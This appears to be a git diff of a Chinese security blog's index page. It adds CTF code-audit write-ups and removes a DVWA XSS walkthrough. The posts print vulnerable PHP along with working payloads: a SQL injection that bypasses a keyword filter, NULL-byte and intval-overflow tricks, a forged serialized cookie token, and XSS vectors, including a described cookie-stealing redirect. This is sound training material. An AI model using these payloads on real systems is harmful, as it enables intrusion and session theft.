@@ -336,6 +336,915 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/05/01/ereg正则截断/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/05/01/ereg正则截断/" class="post-title-link" itemprop="url">ereg正则截断</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-01 09:13:52 / 修改时间：09:14:12" itemprop="dateCreated datePublished" datetime="2019-05-01T09:13:52+08:00">2019-05-01</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计（基础篇）/" itemprop="url" rel="index"><span itemprop="name">代码审计（基础篇）</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <pre><code>&lt;?php 
+
+$flag = &quot;flag&quot;;
+
+if (isset ($_GET[&apos;password&apos;])) 
+{
+  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)
+  {
+    echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;
+  }
+  else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)
+   {
+     if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置
+      {
+      die(&apos;Flag: &apos; . $flag);
+      }
+      else
+      {
+        echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;); 
+       }
+      }
+     else 
+     {
+        echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;; 
+      }
+   } 
+?&gt;
+</code></pre><p>审计上面代码可以发现<br>要想的到flag必须满足一下3个条件<br>1、必须是数字、字母组成的密码<br>2、密码的长度小于8，却必须要大于9999999<br>3、密码必须包含<em>—</em></p>
+<p>对于第二个条件，使用科学计数法绕过<br>对于第三个条件，由于ereg()函数存在NULL截断漏洞，所以可以用%00（空字符）来截断正则匹配。那么我们就可以绕过第3个条件了<br>那么我们就可以构造出payload为<code>1e8%00*—*</code></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/05/01/SQL注入-WITH-ROLLUP绕过/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/05/01/SQL注入-WITH-ROLLUP绕过/" class="post-title-link" itemprop="url">SQL注入_WITH ROLLUP绕过</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-01 09:12:36 / 修改时间：09:13:03" itemprop="dateCreated datePublished" datetime="2019-05-01T09:12:36+08:00">2019-05-01</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计（基础篇）/" itemprop="url" rel="index"><span itemprop="name">代码审计（基础篇）</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>题目地址<br><a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a>    </p>
+<pre><code>&lt;?php
+    error_reporting(0);
+
+    if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) {
+        echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+        echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+        echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+        echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+        echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+        echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;
+        die;
+    }
+
+    function AttackFilter($StrKey,$StrValue,$ArrReq){  
+        if (is_array($StrValue)){
+
+    //检测变量是否是数组
+
+            $StrValue=implode($StrValue);
+
+    //返回由数组元素组合成的字符串
+
+        }
+        if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){   
+
+    //匹配成功一次后就会停止匹配
+
+            print &quot;水可载舟，亦可赛艇！&quot;;
+            exit();
+        }
+    }
+
+    $filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;
+    foreach($_POST as $key=&gt;$value){ 
+
+    //遍历数组
+
+        AttackFilter($key,$value,$filter);
+    }
+
+    $con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);
+    if (!$con){
+        die(&apos;Could not connect: &apos; . mysql_error());
+    }
+    $db=&quot;XXXXXX&quot;;
+    mysql_select_db($db, $con);
+
+    //设置活动的 MySQL 数据库
+
+    $sql=&quot;SELECT * FROM interest WHERE uname = &apos;{$_POST[&apos;uname&apos;]}&apos;&quot;;
+    $query = mysql_query($sql); 
+
+    //执行一条 MySQL 查询
+
+    if (mysql_num_rows($query) == 1) { 
+
+    //返回结果集中行的数目
+
+        $key = mysql_fetch_array($query);
+
+    //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+
+        if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {
+            print &quot;CTF{XXXXXX}&quot;;
+        }else{
+            print &quot;亦可赛艇！&quot;;
+        }
+    }else{
+        print &quot;一颗赛艇！&quot;;
+    }
+    mysql_close($con);
+    ?&gt;
+</code></pre><p>审计代码寻找有用部分</p>
+<pre><code>if (mysql_num_rows($query) == 1) { 
+
+ //返回结果集中行的数目
+
+     $key = mysql_fetch_array($query);
+
+ //返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+
+     if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) {
+         print &quot;CTF{XXXXXX}&quot;;
+</code></pre><p>注入成功要满足2个条件：</p>
+<ol>
+<li><p>mysql_num_rows($query) == 1 即查询返回的结果行数为1</p>
+</li>
+<li><p>$key[‘pwd’] == $_POST[‘pwd’] 即查询返回的结果与POST发送的pwd值相同</p>
+</li>
+</ol>
+<p>从源代码得出，注入点在uname这个位置上，$filter没有过滤掉 or </p>
+<p>$sql=”SELECT * FROM interest WHERE uname = ‘{$_POST[‘uname’]}’”;</p>
+<pre><code>$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;
+</code></pre><p>  对and等等进行过滤。<br>  那么如果只让其对返回结果只取最后一行呢，自然而然的想到limit a,b这样的命令。但是“，”被过滤了。那么我们可以使用 limit a offset b</p>
+<p><strong>SQL查询语句中的 limit 与 offset 的区别：</strong></p>
+<p>limit y 分句表示: 读取 y 条数据         //limit 10,就是 从第0个开始，获取10条数据</p>
+<p>limit x, y 分句表示: 跳过 x 条数据，读取 y 条数据   //limit 1,2 就是读取2-3条数据</p>
+<p>limit y offset x 分句表示: 跳过 x 条数据，读取 y 条数据   //limit 2 offest 1 就是读取2-3条数据</p>
+<p><strong>注意初始偏移量为0</strong></p>
+<p><strong>payload如下</strong></p>
+<pre><code>uname=&apos; || 1 group by pwd with rollup limit 1 offset 2 #
+</code></pre><p>   // uname=’ or 1 group by pwd with rollup limit 1 offset 2#</p>
+<p>‘是对前面的’的封闭，然后利用||1将这个条件变成true，即可得出flag,</p>
+<p>(group by是把前面的查询的内容按照pwd来分组。with rollup是统计信息的这里就是重点了，因为代码中$key[‘pwd’] == $_POST[‘pwd’]用的是双等号是弱比较。而with rollup会在查询的结果后面加上一个为空的列,所以password为空和NULL是相等的就绕过了pwd的比较)</p>
+<p>至于为啥offset 2，这个是试出来的，其实我们根本不可能知道with rollup会总结归纳出多少条信息，offset 2能过说明正确的pwd位于第三条信息</p>
+<p><strong>这里要注意一点，当使用rollup的时候就不能使用order by进行排序，换句话说 rollup和order by是相互排斥的。</strong></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/05/01/Multiple-Encryption/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/05/01/Multiple-Encryption/" class="post-title-link" itemprop="url">多重加密</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-05-01 09:09:45 / 修改时间：09:11:52" itemprop="dateCreated datePublished" datetime="2019-05-01T09:09:45+08:00">2019-05-01</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计（基础篇）/" itemprop="url" rel="index"><span itemprop="name">代码审计（基础篇）</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <pre><code>&lt;?php
+    include &apos;common.php&apos;;
+    $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);
+    //把一个或多个数组合并为一个数组
+    class db
+    {
+        public $where;
+        function __wakeup()
+        {
+            if(!empty($this-&gt;where))
+            {
+                $this-&gt;select($this-&gt;where);
+            }
+        }
+        function select($where)
+        {
+            $sql = mysql_query(&apos;select * from user where &apos;.$where);
+            //函数执行一条 MySQL 查询。
+            return @mysql_fetch_array($sql);
+            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
+        }
+    }
+
+    if(isset($requset[&apos;token&apos;]))
+    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
+    {
+        $login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));
+        //gzuncompress:进行字符串压缩
+        //unserialize: 将已序列化的字符串还原回 PHP 的值
+
+        $db = new db();
+        $row = $db-&gt;select(&apos;user=\&apos;&apos;.mysql_real_escape_string($login[&apos;user&apos;]).&apos;\&apos;&apos;);
+        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
+
+        if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)
+        {
+            echo $flag;
+        }else if($row[&apos;pass&apos;] !== $login[&apos;pass&apos;]){
+            echo &apos;unserialize injection!!&apos;;
+        }else{
+            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;
+        }
+    }else{
+        header(&apos;Location: index.php?error=1&apos;);
+    }
+
+?&gt; 
+</code></pre><p>阅读代码寻找有用的代码段</p>
+<pre><code>if($login[&apos;user&apos;] === &apos;ichunqiu&apos;)
+        {
+            echo $flag;
+</code></pre><p>发现login[user]要求=ichunqiu，才能输出flag。但是</p>
+<pre><code>$login = unserialize(gzuncompress(base64_decode($requset[&apos;token&apos;])));
+//先对token进行base-64解密，然后再进行解压gzuncompress字符串，最后在反序列化
+</code></pre><p>那么我们就要在cookie中给token一个参数，先是创建一个数组并给其中的user键赋值为ichunqiu先序列化，然后压缩字符串（gzcompress方法），最后再base-64加密<br>写成php代码如下（）</p>
+<pre><code>&lt;?php 
+$a = array(&apos;user&apos;=&gt;&apos;ichunqiu&apos;);
+$b = base64_encode(gzcompress(serialize($a)));
+echo $b
+?&gt;
+</code></pre><p>可以输出<img src="/2019/05/01/Multiple-Encryption/1.png" alt="在这里插入图片描述"></p>
+<p>然后抓包，在cookie中添加 taken参数，其值为截图中的内容即可得出flag</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/04/08/Blank-to-bypass/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wr">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="giun">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2019/04/08/Blank-to-bypass/" class="post-title-link" itemprop="url">绕过过滤的空白字符</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-04-08 20:28:29 / 修改时间：20:30:54" itemprop="dateCreated datePublished" datetime="2019-04-08T20:28:29+08:00">2019-04-08</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/代码审计（基础篇）/" itemprop="url" rel="index"><span itemprop="name">代码审计（基础篇）</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>  &lt;?php</p>
+<pre><code>$info = &quot;&quot;; 
+$req = [];
+$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;
+
+ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值
+error_reporting(0); //关闭所有PHP错误报告
+
+if(!isset($_GET[&apos;number&apos;])){
+   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt
+
+   die(&quot;have a fun!!&quot;); //die — 等同于 exit()
+
+}
+
+foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式 
+    foreach($global_var as $key =&gt; $value) { 
+        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
+        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
+    } 
+} 
+</code></pre><p>​<br>    function is_palindrome_number($number) {<br>        $number = strval($number); //strval — 获取变量的字符串值<br>        $i = 0;<br>        $j = strlen($number) - 1; //strlen — 获取字符串长度<br>        while($i &lt; $j) {<br>            if($number[$i] !== $number[$j]) {<br>                return false;<br>            }<br>            $i++;<br>            $j–;<br>        }<br>        return true;<br>    } </p>
+<p>​<br>    if(is_numeric($_REQUEST[‘number’])) //is_numeric — 检测变量是否为数字或数字字符串<br>    {</p>
+<pre><code>   $info=&quot;sorry, you cann&apos;t input a number!&quot;;
+
+}
+elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;]))) //intval — 获取变量的整数值
+{
+
+     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  
+
+}
+else
+{
+
+     $value1 = intval($req[&quot;number&quot;]);
+     $value2 = intval(strrev($req[&quot;number&quot;]));  
+
+     if($value1!=$value2){
+          $info=&quot;no, this is not a palindrome number!&quot;;
+     }
+     else
+     {
+
+          if(is_palindrome_number($req[&quot;number&quot;])){
+              $info = &quot;nice! {$value1} is a palindrome number!&quot;; 
+          }
+          else
+          {
+             $info=$flag;
+          }
+     }
+
+}
+
+echo $info;
+</code></pre><p>审计代码可以发现，number必须符合下面3个条件才可以输出flag<br>1.不为空，且不能是一个数值型数字，包括小数。(由is_numeric函数判断)<br>2.不能是一个回文数。（is_palindrome_number判断）<br>3.该数的反转的整数值应该和它本身的整数值相等;即</p>
+<pre><code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))
+</code></pre><p>但是2和3又冲突，这该怎么办</p>
+<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>我们构造的payload为：</p>
+<pre><code>?number=%002147483647
+</code></pre><p><strong>解释下为什么可以这么构造；</strong><br>1、is_numeric函数对于空字符%00判断为非数值，绕过第一个条件。<br>  函数判断为非数值，但又不影响它值的构造，理所当然想到空格字符%20和空字符%00。</p>
+<p>2、2147483647不是一个回文数绕过第二个条件。</p>
+<p>3、这里利用了intval函数的溢出问题。<br>      Intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。<br>      至于服务器是什么系统的可以用burp抓包分析出来为32位</p>
+<pre><code>$value1 = intval($req[&quot;number&quot;]);
+$value2 = intval(strrev($req[&quot;number&quot;]));  
+</code></pre><p>我们构造的2147483647经过strrev反转函数后为7463847412，又经过intval函数值又变为2147483647。<br>故满足条件3，可以输出flag</p>
+<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>因为要求不能为回文数，但又要满足<code>intval($req[&quot;number&quot;])=intval(strrev($req[&quot;number&quot;]))，</code>所以我们采用科学计数法构造payload为<code>number=0e-0%00</code>，这样的话我们就可以绕过。</p>
+<p>xey在php中就是x*10的y次方</p>
+<p><strong>注意</strong><br>is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值，而%20空格字符只能放在数值后</p>
+<h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h2><p>is_numeric函数在开始判断前，会先跳过所有空白字符可是题目获取$req[‘number’]的时候明明使用trim过滤了空白字符这时候我们可以引入\f（也就是%0c）在数字前面，来绕过最后那个is_palindrome_number函数，而对于前面的数字判断，因为intval和is_numeric都会忽略这个字符，所以不会影响。<br>所以我们构造payload=URL?%00%0c191即可绕过上面的条件获得flag</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/04/08/upload-labs-1-17/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1856,740 +2765,6 @@ if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://wrgiun.github.io/2019/03/14/DVWA-xss/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wr">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="giun">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/14/DVWA-xss/" class="post-title-link" itemprop="url">DVWA之xss</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-03-14 15:58:22 / 修改时间：16:08:39" itemprop="dateCreated datePublished" datetime="2019-03-14T15:58:22+08:00">2019-03-14</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/DVWA/" itemprop="url" rel="index"><span itemprop="name">DVWA</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="一、反射（reflected）型"><a href="#一、反射（reflected）型" class="headerlink" title="一、反射（reflected）型"></a>一、反射（reflected）型</h2><p><strong>（一）、尝试low等级</strong><br>输入正常数字，返回以下内容<br><img src="/2019/03/14/DVWA-xss/1.jpg" alt="在这里插入图片描述"><br>再输入<code>&lt;xss&gt;</code>发现，只输出了hello<br><img src="/2019/03/14/DVWA-xss/2.jpg" alt="在这里插入图片描述"><br>我们使用火狐的开发者工具查看下元素<br>发现hello的后面是一对xss标签<br><img src="/2019/03/14/DVWA-xss/3.jpg" alt="在这里插入图片描述"><br>我们进行弹窗测试<br>输入<code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>发现弹窗，说明存在xss注入<br><img src="/2019/03/14/DVWA-xss/4.jpg" alt="在这里插入图片描述"><br>介绍javaScript的3个弹窗函数<br>alert()     ,confirm()   ,prompt()<br><img src="/2019/03/14/DVWA-xss/5.jpg" alt="在这里插入图片描述"><br><strong>攻击者思路</strong><br><img src="/2019/03/14/DVWA-xss/6.jpg" alt="在这里插入图片描述"><br>攻击者web设计<br><img src="/2019/03/14/DVWA-xss/7.jpg" alt="在这里插入图片描述"><br>构造估计的js脚本</p>
-<p>document.location就是页面的内容定位到指定的位置，他会访问参数中的地址，参数里面写上刚刚新建的php文件的网址，document.cookie就是赋值给这个php的cookie参数，这个cookie值最终会出现在网站127.0.0.1/cookie.php中<br><img src="/2019/03/14/DVWA-xss/8.jpg" alt="在这里插入图片描述"><br>构造并发送攻击url<br><img src="/2019/03/14/DVWA-xss/9.jpg" alt="在这里插入图片描述"><br>这样子还不行还需要url编码<br><img src="/2019/03/14/DVWA-xss/10.jpg" alt="在这里插入图片描述">最后劫持会话<br>修改cookie，修改为之前获取的cookie值。</p>
-<p><strong>（二）、尝试medium等级，</strong><br>只要在<code>&lt;srcipt&gt;标签中插入一个&lt;script&gt;即可，&lt;src&lt;srcipt&gt;ipt&gt;，</code>因为他过滤了<code>&lt;sript&gt;</code>标签其他步骤与low等级一样。<br><strong>（三）尝试high等级。</strong><br>上面的方法都失效了，那么我们想到了img标签也是可以执行js代码的</p>
-<pre><code>&lt;img src= x onerror=alert(1)&gt;
-</code></pre><p><img src="/2019/03/14/DVWA-xss/11.jpg" alt="在这里插入图片描述"><br>使用iframe标签也可以成功注入<code>&lt;iframe onload=alert(1)&gt;</code><br>说明只过滤了script标签<br><strong>（四）impose等级</strong><br>查看源码<br><img src="/2019/03/14/DVWA-xss/12.jpg" alt="在这里插入图片描述"><br>发现htmlspecialchars函数<br>那么这是函数是干啥的呢？<br>可以把</p>
-<pre><code> &amp;过滤成&amp;amp;
-&quot;过滤成&amp;quto;
-&apos;过滤成&amp;apos;
-&lt;过滤成&amp;lt;
-&gt;过滤成&amp;gt;
-</code></pre><h2 id="二、存储型（stored）反射"><a href="#二、存储型（stored）反射" class="headerlink" title="二、存储型（stored）反射"></a>二、存储型（stored）反射</h2><p><strong>（一）、尝试low等级</strong>，<br>使用火狐浏览器开发者工具，发现name被限制为10个字符，message被限制为50个字符.这对我们xss注入是不够的。<br><img src="/2019/03/14/DVWA-xss/13.jpg" alt="在这里插入图片描述"><br>那么我们就抓包发送name,message参数<br>成功绕过了限制<br><img src="/2019/03/14/DVWA-xss/14.jpg" alt="在这里插入图片描述"><br>存储型的数据是存在数据库里，大家可以选择<br>setup/resetDB重置数据库，清楚数据<br><strong>（二）尝试medium等级</strong><br>发现name过滤alert ,和script标签，message过滤了script标签。尝试script大小写发现无法弹窗<br>这个是部分源码<br><img src="/2019/03/14/DVWA-xss/15.jpg" alt="在这里插入图片描述"><br>我们尝试iframe标签</p>
-<pre><code>txtName=&lt;iframe onload=alert(/xss/)&gt;&amp;mtxMessage=&lt;iframe src =1 onload=alert(/ss/)&gt;&amp;btnSign=Sign+Guestbook
-</code></pre><p><img src="/2019/03/14/DVWA-xss/16.jpg" alt="在这里插入图片描述"><br>发现name成功弹窗,但是message不行，不过没关系，可以进行xss注入</p>
-<p><strong>（三）、尝试high等级</strong><br>和medium的方法一样，不同是high等级的message对&lt; &gt; “ &amp; ‘进行了处理<br><strong>（四）、尝试impose等级</strong><br>查看源码<br><img src="/2019/03/14/DVWA-xss/17.jpg" alt="在这里插入图片描述"><br>name和message都对&lt; &gt; \” &amp; \’进行了过滤</p>
-<h2 id="三、DOM型XSS"><a href="#三、DOM型XSS" class="headerlink" title="三、DOM型XSS"></a>三、DOM型XSS</h2><p><strong>（一）、尝试low等级</strong><br>我们尝试注入</p>
-<pre><code>http://localhost/DVWA/vulnerabilities/xss_d/?default=&lt;script&gt;alert(/hack/)&lt;/script&gt;
